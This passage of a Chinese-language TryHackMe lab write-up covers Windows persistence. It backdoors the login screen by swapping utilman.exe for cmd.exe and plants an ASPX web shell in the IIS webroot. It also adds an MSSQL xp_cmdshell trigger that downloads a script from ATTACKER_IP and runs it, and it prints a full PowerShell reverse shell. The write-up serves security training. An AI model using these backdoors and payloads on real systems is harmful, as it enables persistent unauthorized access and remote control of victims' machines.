<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206172311558.png" alt="image-20240206172311558"></p>
<p>执行此操作后，从开始菜单锁定您的会话：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206172544947.png" alt="image-20240206172544947"></p>
<p>您现在应该可以按五次 <code>SHIFT</code> 直接从登录屏幕访问具有系统权限的终端：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206172419283.png" alt="image-20240206172419283"></p>
<h3 id="utilman">Utilman</h3>
<p>Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206172630495.png" alt="image-20240206172630495"></p>
<p>当我们单击登录屏幕上的轻松访问按钮时，它会以系统权限执行 <code>C:\Windows\System32\Utilman.exe</code> 。如果我们将其替换为 <code>cmd.exe</code> 的副本，我们可以再次绕过登录屏幕。</p>
<p>为了替换 <code>utilman.exe</code> ，我们执行与 <code>sethc.exe</code> 类似的过程：</p>
<pre><code class="hljs scss">C:\&gt; takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): <span class="hljs-string">"c:\Windows\System32\utilman.exe"</span> now owned by user <span class="hljs-string">"PURECHAOS\Administrator"</span>.

C:\&gt; icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed <span class="hljs-number">1</span> files; Failed processing <span class="hljs-number">0</span> files

C:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) copied.</code></pre>
<p>要触发我们的终端，我们将从开始按钮锁定屏幕：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206172654191.png" alt="image-20240206172654191"></p>
<p>最后，继续单击“轻松访问”按钮。由于我们将 <code>utilman.exe</code> 替换为 <code>cmd.exe</code> 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206172853964.png" alt="image-20240206172853964"></p>
<h2 id="27-通过现有服务持续存在">2.7 通过现有服务持续存在</h2>
<p>如果您不想使用 Windows 功能来隐藏后门，您始终可以从任何可用于为您运行代码的现有服务中获益。此任务将探讨如何在典型的 Web 服务器设置中植入后门。尽管如此，您对执行内容有一定程度控制的任何其他应用程序都应该类似地存在后门。可能性是无止境！</p>
<h3 id="使用-web-shell">使用 Web Shell</h3>
<p>在 Web 服务器中实现持久化的常用方法是将 Web shell 上传到 Web 目录。这很简单，将授予我们使用 IIS 中配置的用户的权限进行访问，默认情况下为 <code>iis apppool\defaultapppool</code> 。即使这是一个非特权用户，它也具有特殊的 <code>SeImpersonatePrivilege</code> ，提供了一种使用各种已知漏洞升级到管理员的简单方法。有关如何滥用此权限的详细信息，请参阅 Windows Privesc Room。</p>
<p>让我们首先下载 <a target="_blank" rel="noopener" href="http://ASP.NET">ASP.NET</a> Web shell（<a target="_blank" rel="noopener" href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx">here</a>）这里提供了一个现成的 Web shell，但您可以随意使用您喜欢的任何一个。将其传输到受害计算机并将其移至 webroot，默认情况下位于 <code>C:\inetpub\wwwroot</code> 目录中：</p>
<p>这里依旧在攻击机上开启http服务，在受害机上用powershell下载木马</p>
<pre><code class="hljs scss">C:\&gt; move shell.aspx C:\inetpub\wwwroot\</code></pre>
<p>注意：根据您创建/传输 <code>shell.aspx</code> 的方式，文件中的权限可能不允许 Web 服务器访问它。如果您在访问 shell 的 URL 时遇到“权限被拒绝”错误，只需授予每个人对该文件的完全权限即可使其正常工作。您可以使用 <code>icacls shell.aspx /grant Everyone:F</code> 来做到这一点。</p>
<p>然后，我们可以通过指向以下 URL 从 Web 服务器运行命令：</p>
<pre><code class="hljs scss">http://<span class="hljs-number">10.10</span>.<span class="hljs-number">73.60</span>/shell.aspx</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206182458012.png" alt="image-20240206182458012"></p>
<h3 id="使用-mssql-作为后门">使用 MSSQL 作为后门</h3>
<p>在 MSSQL Server 安装中植入后门的方法有多种。现在，我们将看看其中一个滥用触发器的情况。简而言之，MSSQL 中的触发器允许您绑定在数据库中发生特定事件时要执行的操作。这些事件的范围可以从用户登录到从给定表中插入、更新或删除数据。对于此任务，我们将为 <code>HRDB</code> 数据库中的任何 INSERT 创建触发器。</p>
<p>在创建触发器之前，我们必须首先在数据库上重新配置一些东西。首先，我们需要启用 <code>xp_cmdshell</code> 存储过程。 <code>xp_cmdshell</code> 是一个存储过程，在任何 MSSQL 安装中默认提供，允许您直接在系统控制台中运行命令，但默认情况下处于禁用状态。</p>
<p>要启用它，请从开始菜单打开 <code>Microsoft SQL Server Management Studio 18</code> 。当要求进行身份验证时，只需使用 Windows 身份验证（默认值），您将使用当前 Windows 用户的凭据登录。默认情况下，本地管理员帐户将有权访问所有数据库。</p>
<p>登录后，单击“新建查询”按钮打开查询编辑器：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206183442426.png" alt="image-20240206183442426"></p>
<p>运行以下 SQL 语句启用 MSSQL 配置中的“高级选项”，然后继续启用 <code>xp_cmdshell</code> 。</p>
<pre><code class="hljs sql">sp_configure <span class="hljs-string">'Show Advanced Options'</span>,<span class="hljs-number">1</span>;
RECONFIGURE;
GO

sp_configure <span class="hljs-string">'xp_cmdshell'</span>,<span class="hljs-number">1</span>;
RECONFIGURE;
GO</code></pre>
<p>之后，我们必须确保任何访问数据库的网站都可以运行 <code>xp_cmdshell</code> 。默认情况下，只有具有 <code>sysadmin</code> 角色的数据库用户才能执行此操作。由于预计 Web 应用程序会使用受限数据库用户，因此我们可以向所有用户授予权限来模拟 <code>sa</code> 用户，这是默认的数据库管理员：</p>
<p>之后，我们必须确保任何访问数据库的网站都可以运行 <code>xp_cmdshell</code> 。默认情况下，只有具有 <code>sysadmin</code> 角色的数据库用户才能执行此操作。由于预计 Web 应用程序会使用受限数据库用户，因此我们可以向所有用户授予权限来模拟 <code>sa</code> 用户，这是默认的数据库管理员：</p>
<pre><code class="hljs sql">USE master;

<span class="hljs-keyword">GRANT</span> IMPERSONATE <span class="hljs-keyword">ON</span> LOGIN::sa <span class="hljs-keyword">to</span> [Public];</code></pre>
<p>完成所有这些之后，我们终于配置了一个触发器。我们首先更改为 <code>HRDB</code> 数据库：</p>
<pre><code class="hljs sql">USE HRDB;</code></pre>
<p>我们的触发器将利用 <code>xp_cmdshell</code> 执行 Powershell，从攻击者控制的 Web 服务器下载并运行 <code>.ps1</code> 文件。触发器将配置为每当将 <code>INSERT</code> 放入 <code>HRDB</code> 数据库的 <code>Employees</code> 表中时执行：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> [sql_backdoor]
<span class="hljs-keyword">ON</span> HRDB.dbo.Employees 
<span class="hljs-keyword">FOR</span> <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">AS</span>

<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">AS</span> LOGIN <span class="hljs-operator">=</span> <span class="hljs-string">'sa'</span>
<span class="hljs-keyword">EXEC</span> master..xp_cmdshell <span class="hljs-string">'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"'</span>;</code></pre>
<p>现在后门已设置完毕，让我们在攻击者的计算机中创建 <code>evilscript.ps1</code> ，其中将包含 Powershell 反向 shell：</p>
<pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">"ATTACKER_IP"</span>,<span class="hljs-number">5555</span>);

<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();
[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%{<span class="hljs-number">0</span>};
<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>){
    <span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);
    <span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );
    <span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">"PS "</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">"&gt; "</span>;
    <span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);
    <span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);
    <span class="hljs-variable">$stream</span>.Flush()
};

<span class="hljs-variable">$client</span>.Close()</code></pre>
<p>我们需要打开两个终端来处理此漏洞利用中涉及的连接：</p>
<ul>
<li>触发器将执行第一次连接来下载并执行 <code>evilscript.ps1</code> 。我们的触发器使用端口 8000。</li>
<li>第二个连接将是端口 5555 上的反向 shell 返回到我们的攻击者计算机。</li>
</ul>
<p>一切准备就绪后，让我们导航到 <code>http://10.10.73.60/</code> 并将员工插入到 Web 应用程序中。由于 Web 应用程序将向数据库发送 INSERT 语句，因此我们的 TRIGGER 将为我们提供对系统控制台的访问。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206185607361.png" alt></p>
<p>执行之后，访问受害机web网站</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206185649171.png" alt="image-20240206185649171"></p>
<p>如上图，添加SQL用户，点击add，即可看到下图，拿到shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206185551605.png" alt="image-20240206185551605"></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/02/06/thm-windows-ben-di-chi-jiu-xing/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/02/06/thm-windows-ben-di-chi-jiu-xing/')">THM-Windows本地持久性</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/02/06/thm-windows-ben-di-chi-jiu-xing/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-Windows本地持久性&amp;url=http://hybcx.xyz/2024/02/06/thm-windows-ben-di-chi-jiu-xing/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/06/thm-windows-quan-xian-ti-sheng/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Windows权限提升</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/08/thm-rootme/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-RootMe</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%9C%AC%E5%9C%B0%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">0x02 本地持久性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E7%AF%A1%E6%94%B9%E9%9D%9E%E7%89%B9%E6%9D%83%E8%B4%A6%E6%88%B7"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 篡改非特权账户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E7%BB%84%E6%88%90%E5%91%98%E8%B5%84%E6%A0%BC"><span class="toc-number">2.1.1.</span> <span class="toc-text">分配组成员资格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90%E5%92%8C%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">2.1.2.</span> <span class="toc-text">特殊权限和安全描述符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rid%E5%8A%AB%E6%8C%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">RID劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 后门文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">可执行文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.2.</span> <span class="toc-text">快捷方式文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94"><span class="toc-number">2.2.3.</span> <span class="toc-text">劫持文件关联</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E6%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 滥用服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.1.</span> <span class="toc-text">创建后门服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.2.</span> <span class="toc-text">修改现有服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-%E6%BB%A5%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 滥用计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.4.1.</span> <span class="toc-text">任务调度程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9%E6%88%91%E4%BB%AC%E7%9A%84%E4%BB%BB%E5%8A%A1%E9%9A%90%E5%BD%A2"><span class="toc-number">2.4.2.</span> <span class="toc-text">让我们的任务隐形</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E7%99%BB%E5%BD%95%E8%A7%A6%E5%8F%91%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 登录触发持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">2.5.1.</span> <span class="toc-text">启动文件夹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#run-runonce"><span class="toc-number">2.5.2.</span> <span class="toc-text">Run &#x2F; RunOnce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.5.3.</span> <span class="toc-text">登录系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-number">2.5.4.</span> <span class="toc-text">登录脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E7%99%BB%E5%BD%95%E5%B1%8F%E5%B9%95rdp-%E5%90%8E%E9%97%A8"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 登录屏幕&#x2F;RDP 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sticky-keys-%E7%B2%98%E6%BB%9E%E9%94%AE"><span class="toc-number">2.6.1.</span> <span class="toc-text">Sticky Keys 粘滞键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#utilman"><span class="toc-number">2.6.2.</span> <span class="toc-text">Utilman</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E9%80%9A%E8%BF%87%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E5%AD%98%E5%9C%A8"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 通过现有服务持续存在</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-web-shell"><span class="toc-number">2.7.1.</span> <span class="toc-text">使用 Web Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-mssql-%E4%BD%9C%E4%B8%BA%E5%90%8E%E9%97%A8"><span class="toc-number">2.7.2.</span> <span class="toc-text">使用 MSSQL 作为后门</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time 